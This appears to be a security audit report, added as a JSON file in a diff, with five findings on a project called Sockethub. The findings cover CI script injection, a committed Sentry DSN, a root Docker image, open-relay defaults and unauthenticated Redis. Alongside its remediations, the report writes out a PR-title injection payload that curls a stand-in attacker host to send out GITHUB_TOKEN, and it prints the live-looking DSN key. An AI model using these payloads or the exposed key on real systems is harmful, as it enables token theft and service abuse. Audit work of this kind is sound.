@@ -1,0 +1,77 @@
+[
+  {
+    "severity": "HIGH",
+    "location": ".github/workflows/validate-branch.yml",
+    "title": "CI/CD Script Injection via PR Title and Branch Name",
+    "description": "The validate-branch.yml workflow directly interpolates attacker-controlled values (github.event.pull_request.title and github.head_ref) into shell run: steps using ${{ }} expression syntax. This is a well-documented GitHub Actions script injection pattern that allows arbitrary command execution on the CI runner for any opened pull request.",
+    "impact": "Arbitrary code execution in the GitHub Actions runner. From fork PRs: crypto mining, network reconnaissance, GitHub Actions cache poisoning, and validation bypass. From same-repo PRs: exfiltration of the GITHUB_TOKEN (whose permissions default to read+write unless explicitly restricted), enabling unauthorized repository modifications.",
+    "attack_path": "1. Attacker opens a PR from any fork (no repository access needed). 2. Sets PR title to: feat: x\"; curl http://attacker.com/exfil?t=${GITHUB_TOKEN}; echo \" 3. The validate-branch.yml workflow triggers on pull_request event. 4. The 'Validate PR title' step interpolates the title directly into bash: TITLE=\"${{ github.event.pull_request.title }}\" which becomes TITLE=\"feat: x\"; curl http://attacker.com/exfil?t=${GITHUB_TOKEN}; echo \" 5. Shell executes the injected commands. The same vector exists via branch name (github.head_ref) which allows characters ;$`|&(){}!'\"<> in git refs.",
+    "evidence": [
+      ".github/workflows/validate-branch.yml:13 - BRANCH=\"${{ github.head_ref }}\"",
+      ".github/workflows/validate-branch.yml:67 - TITLE=\"${{ github.event.pull_request.title }}\"",
+      ".github/workflows/validate-branch.yml:4 - triggers on pull_request (any PR including forks)"
+    ],
+    "remediation": "Replace direct ${{ }} interpolation with environment variables. Change to: env: BRANCH: ${{ github.head_ref }} then reference as \"$BRANCH\" in the script. Environment variable expansion in bash is safe against the injection because the value is assigned before shell parsing, not interpolated into the script text. Apply the same fix for github.event.pull_request.title.",
+    "poc_video_notes": "Create a fork, make a branch, open a PR with title: feat: x\"; id; echo \" -- observe the `id` command output in the Actions log of the validate-branch workflow run."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "packages/sockethub/sockethub.config.json.sentry",
+    "title": "Hardcoded Sentry DSN Committed to Repository",
+    "description": "A production Sentry DSN (Data Source Name) is committed in plaintext to the public repository. While DSNs are traditionally considered 'public' by Sentry's own docs, they still enable abuse by anyone who reads the repository.",
+    "impact": "An attacker can use the exposed DSN to flood the Sentry project with fabricated error events, exhausting the project's event quota and causing legitimate errors to be dropped. They can also inject misleading error reports to misdirect incident response, trigger alert fatigue, or mask real attacks behind noise.",
+    "attack_path": "1. Attacker reads the DSN from the public repository file. 2. Attacker crafts HTTP POST requests to the Sentry ingest endpoint (https://o4508859714895872.ingest.de.sentry.io/api/4508859718369360/envelope/) with the DSN auth header. 3. Sentry accepts these events as legitimate, consuming the project's monthly quota. 4. Once quota is exhausted, real production errors are silently dropped. Alternatively, fake 'critical' errors trigger PagerDuty/Slack alerts causing alert fatigue.",
+    "evidence": [
+      "packages/sockethub/sockethub.config.json.sentry:4 - \"dsn\": \"https://ffc702eb2f3b24d9e06ca20e1ef1fd09@o4508859714895872.ingest.de.sentry.io/4508859718369360\""
+    ],
+    "remediation": "Remove the file from the repository and add it to .gitignore. Rotate the DSN in the Sentry project settings (revoke the old key). Provide the DSN via environment variable (SENTRY_DSN) or a deployment-time secret rather than a committed config file. If a sample config is needed, use a placeholder value.",
+    "poc_video_notes": "Use curl to POST a fabricated Sentry envelope to the ingest URL with the exposed DSN key as auth. Show events appearing in the Sentry dashboard."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "Dockerfile",
+    "title": "Development/CI Docker Image Runs as Root",
+    "description": "The main Dockerfile (used by docker-compose.yml for development, CI, and potentially staging deployments) does not include a USER directive in its prod stage, causing the sockethub process to run as root inside the container. The release Dockerfile (Dockerfile.release) correctly drops to USER node, creating an inconsistency where the image most likely to be used in ad-hoc or staging deployments has the weaker security posture.",
+    "impact": "If an attacker achieves code execution within the container (e.g., via a platform vulnerability or dependency exploit), running as root maximizes the blast radius: write access to all container files, ability to install tools, and increased likelihood of container escape via kernel exploits that require CAP_SYS_ADMIN or similar capabilities that are more readily available to root.",
+    "attack_path": "1. Attacker deploys sockethub using the docker-compose.yml (which builds from Dockerfile target:prod) in a staging or semi-production environment. 2. Attacker exploits a vulnerability in a loaded platform or dependency that grants arbitrary code execution within the container. 3. Because the process runs as root (UID 0), the attacker can modify system files, install backdoors, access /proc for container escape attempts, and pivot to the host if additional kernel/runtime vulnerabilities exist.",
+    "evidence": [
+      "Dockerfile:22 - FROM node:22-slim AS prod (no USER directive follows)",
+      "Dockerfile:28 - CMD [\"node\", \"/app/packages/sockethub/bin/sockethub\", \"--host\", \"0.0.0.0\"] (runs as root)",
+      "Dockerfile.release:33 - USER node (release image correctly drops privileges)",
+      "docker-compose.yml:3-6 - sockethub service builds from Dockerfile target:prod"
+    ],
+    "remediation": "Add a non-root user to the dev/CI Dockerfile prod stage, mirroring Dockerfile.release: create a node user (or use the one from the base image), chown /app to that user, and add USER node before the CMD. Alternatively, add user: \"node\" to the docker-compose.yml service definition as a defense-in-depth measure.",
+    "poc_video_notes": "Run docker compose up, then exec into the container with docker exec -it sockethub-sockethub-1 id -- observe uid=0(root) gid=0(root)."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "packages/schemas/src/schemas/sockethub-config.ts",
+    "title": "Insecure Default Configuration Enables Open Relay Abuse",
+    "description": "The default server configuration combines multiple permissive defaults that together create an exploitable open relay: CORS origin defaults to '*' (any website can connect), there is no built-in authentication for WebSocket or HTTP actions connections, maxConnectionsPerIp defaults to 0 (disabled), and maxPlatformInstances defaults to 0 (unlimited child processes). While each is individually documented, their combination means a fresh deployment is immediately exploitable without any configuration change.",
+    "impact": "Any malicious webpage can silently connect visitors' browsers to a default-configured Sockethub instance and use it to relay IRC/XMPP messages, send spam, or perform abuse through the platform protocols. The lack of connection caps means an attacker can fork unlimited platform child processes, causing memory exhaustion and denial of service. Since there is no authentication, the attacker does not need any credentials to use the instance.",
+    "attack_path": "1. Operator deploys Sockethub with default configuration (no config file). 2. Attacker creates a malicious webpage containing JavaScript that connects to the Sockethub instance via WebSocket (CORS allows * by default). 3. Attacker's page stores IRC credentials and sends messages through the instance, using it as an anonymous relay. 4. For DoS: attacker opens hundreds of connections from different actors, each forking a platform child process (no cap), exhausting server memory. 5. The operator has no visibility into who is using the instance since there is no authentication layer.",
+    "evidence": [
+      "packages/schemas/src/schemas/sockethub-config.ts:292 - default: \"*\" (CORS origin)",
+      "packages/schemas/src/schemas/sockethub-config.ts:204 - default: 0 (maxConnectionsPerIp, disabled)",
+      "packages/schemas/src/schemas/sockethub-config.ts:222 - default: 0 (maxPlatformInstances, disabled)",
+      "packages/server/src/listener.ts:46-52 - Socket.IO server uses corsOrigin() which returns '*' by default"
+    ],
+    "remediation": "Change the CORS default to an empty string (blocking all cross-origin by default, failing closed). Add a startup warning when CORS is '*' AND the host is not localhost/127.0.0.1. Set non-zero defaults for maxConnectionsPerIp (e.g. 5) and maxPlatformInstances (e.g. 50). Consider adding optional token-based authentication for the WebSocket transport. Document a 'production hardening' checklist prominently in deployment docs.",
+    "poc_video_notes": "Deploy sockethub with default config on a public IP. From a different origin webpage, use JavaScript to connect via socket.io-client, store IRC credentials, and send a message to an IRC channel -- demonstrating full relay capability from an arbitrary webpage."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "docker-compose.yml",
+    "title": "Redis Exposed Without Authentication on Host Network",
+    "description": "The docker-compose.yml maps Redis port 6379 to the host on all interfaces without requiring authentication. Redis stores encrypted credentials, job queue data, rate-limiter state, and idempotency cache. While the file is labeled as a 'dev/CI harness', it is the primary provided deployment mechanism and is likely used for staging or production-adjacent deployments.",
+    "impact": "If the host is network-accessible (common in cloud VMs, staging environments, or CI runners with public IPs), an attacker can connect directly to Redis and: read/modify job queue data to intercept or inject platform messages, flush all data causing denial of service, or use Redis as a pivot for further attacks (e.g., writing to the filesystem via CONFIG SET if not disabled).",
+    "attack_path": "1. Operator runs docker compose up on a cloud VM with a public IP (or on a network without strict firewall rules). 2. Attacker scans port 6379 and finds an unauthenticated Redis instance. 3. Attacker runs KEYS * to enumerate all stored data. 4. Attacker uses FLUSHALL to destroy all state (DoS). 5. Alternatively, attacker reads the BullMQ job queues to intercept message contents, or injects jobs to impersonate legitimate platform actions.",
+    "evidence": [
+      "docker-compose.yml:23-24 - redis ports: \"6379:6379\" (bound to 0.0.0.0)",
+      "docker-compose.yml:21-22 - redis image with no requirepass configuration",
+      "docker-compose.yml:1-2 - No comment warning against production use at file top"
+    ],
+    "remediation": "Bind Redis only to localhost: change ports to '127.0.0.1:6379:6379'. Better: remove the host port mapping entirely since the sockethub container connects via the Docker network (sockethub-net). Add requirepass to the Redis service via a command override or redis.conf mount. Add a prominent warning comment at the top of docker-compose.yml stating it must not be used for production deployments without security hardening.",
+    "poc_video_notes": "Run docker compose up on a VM. From a different machine on the same network, run redis-cli -h <target-ip> KEYS '*' and show all stored keys are accessible without authentication."
+  }
+]
